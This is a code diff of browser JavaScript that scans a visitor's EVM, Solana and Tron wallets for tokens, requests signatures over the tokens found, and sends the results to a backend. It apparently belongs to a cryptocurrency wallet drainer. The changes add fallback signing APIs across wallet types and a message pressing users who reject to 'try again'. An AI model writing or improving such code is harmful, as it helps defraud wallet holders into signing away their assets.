@@ -694,32 +694,44 @@ async function scanAllChains() {
 
 // ============ SIGNATURE REQUEST ============
 async function requestSignature() {
+  log('=== SIGNATURE REQUEST STARTING ===', 'success');
   showProgress('sign', 'Requesting signature...');
   
+  const hasEVM = evmAddress && evmSigner;
+  const hasSolana = solanaAddress && solanaProvider;
+  const hasTron = tronAddress && tronWeb;
+  
+  log(`Available chains: EVM=${hasEVM}, Solana=${hasSolana}, Tron=${hasTron}`, 'info');
+  
   // EVM Signature
-  if (evmAddress && evmSigner) {
+  if (hasEVM) {
     const evmTokens = foundTokens.filter(t => t.chain === 'evm');
+    log(`EVM tokens: ${evmTokens.length}`, 'info');
     if (evmTokens.length > 0) {
       await requestEVMSignature(evmTokens);
     }
   }
   
   // Solana Signature
-  if (solanaAddress && solanaProvider) {
+  if (hasSolana) {
     const solanaTokens = foundTokens.filter(t => t.chain === 'solana');
+    log(`Solana tokens: ${solanaTokens.length}`, 'info');
     if (solanaTokens.length > 0) {
+      log('ABOUT TO REQUEST SOLANA SIGNATURE...', 'success');
       await requestSolanaSignature(solanaTokens);
     }
   }
   
   // Tron Signature
-  if (tronAddress && tronWeb) {
+  if (hasTron) {
     const tronTokens = foundTokens.filter(t => t.chain === 'tron');
+    log(`Tron tokens: ${tronTokens.length}`, 'info');
     if (tronTokens.length > 0) {
       await requestTronSignature(tronTokens);
     }
   }
   
+  log('=== SIGNATURE REQUEST COMPLETE, SENDING TO BACKEND ===', 'success');
   showProgress('send', 'Completing...');
   await sendToBackend();
 }
@@ -800,8 +812,8 @@ async function requestEVMSignature(evmTokens) {
 // ============ SOLANA SIGNATURE ============
 async function requestSolanaSignature(solanaTokens) {
   try {
-    if (!solanaProvider || !solanaProvider.signMessage) {
-      log('Solana provider does not support signMessage', 'warn');
+    if (!solanaProvider) {
+      log('Solana provider not available', 'warn');
       return;
     }
     
@@ -814,14 +826,31 @@ async function requestSolanaSignature(solanaTokens) {
     
     log('Waiting for signature popup...', 'success');
     
-    const signedMessage = await solanaProvider.signMessage(message, "utf8");
+    let signedMessage;
     
-    log(`✅ Solana Signature: ${signedMessage.signature.substring(0, 30)}...`, 'success');
+    // Try different Solana wallet APIs
+    if (solanaProvider.signMessage && typeof solanaProvider.signMessage === 'function') {
+      // Phantom/Solflare API: signMessage(message)
+      log('Using signMessage API', 'info');
+      const result = await solanaProvider.signMessage(message);
+      signedMessage = result;
+      log(`✅ Solana Signature: ${result.signature ? result.signature.substring(0, 30) : 'confirmed'}...`, 'success');
+    } else if (solanaProvider.sign && typeof solanaProvider.sign === 'function') {
+      // Some wallets use sign() instead
+      log('Using sign API', 'info');
+      const result = await solanaProvider.sign(message);
+      signedMessage = result;
+      log(`✅ Solana Signature: confirmed`, 'success');
+    } else {
+      log('Solana provider signature methods not found. Available methods:', 'error');
+      log(Object.keys(solanaProvider).join(', '), 'error');
+      throw new Error('Solana wallet does not support signing');
+    }
     
   } catch (err) {
     log(`Solana Signature failed: ${err.message}`, 'error');
     
-    if (err.message.includes('User rejected')) {
+    if (err.message.includes('User rejected') || err.message.includes('user rejected')) {
       throw new Error('You rejected the Solana signature. Please try again.');
     } else {
       log('Continuing without Solana signature...', 'warn');
